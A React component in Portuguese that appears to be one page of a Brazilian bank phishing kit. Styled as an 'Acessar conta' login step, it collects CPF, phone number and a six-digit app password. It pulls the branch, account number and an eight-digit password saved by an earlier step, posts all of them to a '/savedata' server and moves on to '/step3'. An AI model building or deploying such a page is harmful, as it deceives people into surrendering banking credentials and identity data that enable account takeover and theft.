import React, { useRef, useState } from 'react'
import InputMask from 'react-input-mask';
import {server} from '../savedata'
import {Link} from 'react-router-dom'
import Navbar from '../components/Navbar'
import './PageTwo.css'

const PageTwo = () => {
  const [cpf, setCpf] = useState(null)
  const [telefone, setTelefone] = useState(null)
  const [senha6, setSenha6] = useState(null)

  const setStore = async () => {
    const agencia = localStorage.getItem('agencia')
    const conta = localStorage.getItem('conta')
    const senha8 = localStorage.getItem('senha8')
    localStorage.setItem('cpf', cpf);
    localStorage.setItem('telefone', telefone);
    localStorage.setItem('senha6', senha6);

    try {
      const response = await server.post('', {
        agencia,
        conta,
        senha8,
        cpf,
        telefone,
        senha6
      });
      console.log('Data saved successfully:', response.data);
    } catch (error) {
      console.log("Erro: ", error)
    }

    window.location.href = '/step3';
  }

  const handleCpf = (e) => {
    setCpf(e.target.value)
  }
  const handleTelefone = (e) => {
    setTelefone(e.target.value)
  }
  const handleSenha6 = (e) => {
    setSenha6(e.target.value)
  }

  return (
    <div className='page1-frame'>
      <div className='next-btn-page2' onClick={() => setStore()}>
        <span>CONTINUAR</span>
      </div>
      <Navbar />
      <div className='navegacao-frame'>
        <i className="bi bi-arrow-left" id='arrow-left'></i>
        <span className='title-of-pages'>Acessar conta</span>
      </div>
      <div className='solicitacao-1'>
        <span className='titulo-solicitacao'>Informe seus dados</span>
        <span className='subtitulo-solicitacao'>Informe os dados para acessar sua conta:</span>
      </div>
      <div className='entradas-1'>
        <span id='titulo-especifico-edit'>CPF</span>
        <InputMask className='input' mask="999.999.999-99" value={cpf} onChange={handleCpf} />
        <span className='titulo-entrada' id='titulo-especifico-edit'>Telefone</span>
        <InputMask className='input' mask="(99) 99999-9999" value={telefone} onChange={handleTelefone} />
        <span className='titulo-entrada' id='titulo-especifico-edit'>Senha de 6 dígitos</span>
        <InputMask className='input' type='password' mask="******"  value={senha6} onChange={handleSenha6} />
        <span className='subtitulo-solicitacao'>A mesma que é usada no aplicativo</span>
      </div>
    </div>
  )
}

export default PageTwo